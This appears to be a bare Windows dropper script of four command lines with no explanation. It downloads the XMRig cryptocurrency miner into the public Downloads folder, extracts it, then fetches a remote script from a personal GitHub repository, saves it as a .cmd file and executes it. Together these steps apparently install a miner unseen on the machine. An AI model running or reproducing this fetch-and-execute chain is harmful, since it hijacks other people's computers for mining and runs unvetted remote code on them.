powershell Invoke-WebRequest -Uri "https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-gcc-win64.zip" -OutFile "C:\Users\Public\Downloads\xmrig.zip"
powershell Expand-Archive -LiteralPath C:\Users\Public\Downloads\xmrig.zip -DestinationPath C:\Users\Public\Downloads
powershell Invoke-WebRequest -Uri "https://raw.githubusercontent.com/marinabarros320168/new/main/restartado.sh" -OutFile "C:\Users\Public\Downloads\xmrig-6.18.1\vai.cmd"
C:\Users\Public\Downloads\xmrig-6.18.1\vai.cmd
